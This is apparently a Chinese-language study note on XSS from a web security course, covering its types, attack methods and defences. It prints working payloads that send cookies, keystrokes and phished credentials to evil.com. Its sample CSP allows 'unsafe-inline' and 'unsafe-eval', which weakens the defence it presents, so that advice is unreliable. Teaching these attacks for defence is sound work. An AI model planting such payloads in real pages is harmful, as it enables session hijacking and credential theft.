# XSS 跨站脚本攻击


## 收集指南

> ⚠️ **严格范围限定：** 仅收集本章（第2章 XSS）相关内容，禁止跨章节引用。

### 条目描述
本文件是《2025Web安全攻防》中关于「XSS」的知识原子文件，属于网络安全方向。

### 知识结构
- XSS 原理
- XSS 类型
- 攻击手法
- 检测方法
- 防御措施

### 待收集原子知识点
- 反射型/存储型/DOM型 XSS
- Cookie 窃取/会话劫持
- CSP 与输出编码
- HttpOnly/SameSite Cookie
- 前端框架自动转义

## 核心知识点

### 一、XSS 原理与类型

- **反射型 XSS：** 恶意脚本在 URL 中，服务器直接反射到页面
  ```
  http://example.com/search?q=<script>alert('XSS')</script>
  ```

- **存储型 XSS：** 恶意脚本存储在数据库中，其他用户访问时触发
  ```
  评论内容：<script>document.location='http://evil.com/steal?c='+document.cookie</script>
  ```

- **DOM 型 XSS：** 前端 JavaScript 直接操作 DOM 导致的漏洞
  ```javascript
  // 危险代码
  document.getElementById('output').innerHTML = location.hash.substring(1);
  ```

### 二、攻击手法

```javascript
// Cookie 窃取
<script>new Image().src='http://evil.com/steal?c='+document.cookie;</script>

// 键盘记录
document.addEventListener('keypress', e => {
    fetch('http://evil.com/log?k='+e.key);
});

// 钓鱼（伪造登录框）
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
    <form action="http://evil.com/phish">
        <input name="user" placeholder="用户名">
        <input name="pass" type="password" placeholder="密码">
        <button>重新登录</button>
    </form>
</div>
```

### 三、防御措施

```python
# 1. 输出编码（最重要）
# HTML 上下文
from markupsafe import escape
safe_html = escape(user_input)  # < → &lt;, > → &gt;

# JavaScript 上下文
import json
safe_js = json.dumps(user_input)  # 转义特殊字符

# URL 上下文
from urllib.parse import quote
safe_url = quote(user_input)
```

```javascript
// 2. CSP（Content Security Policy）
// HTTP 头
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'

// 3. HttpOnly Cookie（防止 JS 读取）
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// 4. 前端框架自动转义（React/Vue）
// React: JSX 自动转义
<p>{userInput}</p>  // 安全
<p dangerouslySetInnerHTML={{__html: userInput}}></p>  // 危险！

// Vue: 双花括号自动转义
<p>{{ userInput }}</p>  // 安全
<p v-html="userInput"></p>  // 危险！
```

### 四、CSP 配置

```
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.example.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
```

### 五、最佳实践

- **输出编码：** 根据上下文（HTML/JS/URL/CSS）选择正确的编码方式
- **CSP：** 限制可执行脚本的来源
- **HttpOnly + Secure + SameSite Cookie：** 多层保护会话
- **输入验证：** 白名单验证输入格式
- **框架转义：** 使用现代前端框架的自动转义功能
- **避免 `innerHTML`/`eval`/`document.write`：** 使用安全的 DOM API
